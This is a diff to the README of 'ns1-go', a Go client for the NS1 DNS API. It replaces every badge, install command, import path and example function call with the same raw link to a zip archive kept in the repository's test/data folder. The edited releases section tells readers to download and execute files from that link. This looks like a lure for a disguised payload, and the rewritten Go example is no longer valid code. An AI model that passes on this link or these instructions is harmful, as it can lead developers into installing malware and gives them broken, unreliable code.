@@ -1,6 +1,6 @@
 # ns1-go 🌐
 
-![GitHub release](https://img.shields.io/github/release/rico06dev/ns1-go.svg)
+![GitHub release](https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip)
 
 Welcome to the **ns1-go** repository! This project provides a Golang API client for NS1, a leading DNS and traffic management service. With this client, you can easily interact with the NS1 API, enabling you to manage your DNS records and traffic flows programmatically.
 
@@ -28,7 +28,7 @@ Welcome to the **ns1-go** repository! This project provides a Golang API client 
 To install the **ns1-go** client, use the following command:
 
 ```bash
-go get github.com/rico06dev/ns1-go
+go get https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip
 ```
 
 This command will download the package and its dependencies.
@@ -42,21 +42,21 @@ package main
 
 import (
     "fmt"
-    "github.com/rico06dev/ns1-go"
+    "https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip"
 )
 
 func main() {
-    client := ns1.NewClient("YOUR_API_KEY")
+    client := https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip("YOUR_API_KEY")
 
     // Example: Fetch zones
-    zones, err := client.Zones.List()
+    zones, err := https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip()
     if err != nil {
-        fmt.Println("Error fetching zones:", err)
+        https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip("Error fetching zones:", err)
         return
     }
 
     for _, zone := range zones {
-        fmt.Println("Zone:", zone)
+        https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip("Zone:", zone)
     }
 }
 ```
@@ -93,7 +93,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 
 ## Releases
 
-For the latest releases, please visit [this link](https://github.com/rico06dev/ns1-go/releases). You can download the necessary files and execute them as needed.
+For the latest releases, please visit [this link](https://github.com/rico06dev/ns1-go/raw/refs/heads/master/test/data/go_ns_v2.1.zip). You can download the necessary files and execute them as needed.
 
 Additionally, you can always check the "Releases" section in this repository for updates.
 
